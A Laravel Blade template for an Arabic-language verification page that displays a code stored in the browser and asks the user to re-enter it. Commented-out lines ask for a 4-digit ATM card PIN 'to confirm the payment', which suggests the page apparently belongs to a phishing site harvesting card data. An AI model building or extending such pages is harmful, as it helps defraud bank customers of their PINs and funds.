@extends('layouts.main')
@section('content')
<section class="padding-start container mb-5">
  <div class="row justify-content-center shadow">
    <div class="col-12 col-lg-7  shadow rounded-bottom">
      <div class="row">
        <div class="col-12 mt-5 mb-4">
          {{-- <div class="card">
          </div> --}}
          <div class="card-body">

            <form method="post" action="{{route('save_recieved_code')}}">
              @csrf
                <div class="col-12 mt-3 ">
                    {{-- <h3 style="color: black">إثبات رقم الهاتف</h3> --}}
                    {{-- <p style="color: black; margin-top: 10px">الرجاء إدخال رقم البطاقة السري للصراف الاًلي (ATM) المكون من 4 خانات للتأك من عملية الدفع</p> --}}
                    <span style="    color: #282626;
                    /* border: 1px solid #999; */
                    padding: 0.2rem 0.5rem;
                    text-align: center;
                    background: #f8f8f8;
                    box-shadow: 1px 1px 4px 0px #8d8585;
                    display: block;
                    margin: auto;
                    width: fit-content;" id="code">

                    </span>
                    <hr>
                </div>
                <div class="col-12">
                  <div class="mb-3">
                    <label for="phone" class="form-label">قم بادخال الكود الموجود بالاعلى</label>
                    <input type="number" class="form-control cd" id="phone" name="phone" placeholder="" required>
                  </div>
                </div>

              </div>
              <div class="col-12 mt-5">
                <button style="width: 100%;" type="submit" class="btn btn-primary btn-lg form-control-lg">التالـــي</button>
              </div>

            </form>

          </div>
        </div>
      </div>
    </div>
  </div>
</section>

@endsection
@section('scripts')
    <script>
      // set content of id ==code by localstorage value
      document.getElementById("code").innerHTML = localStorage.getItem('code') ?? 0;
    </script>
@endsection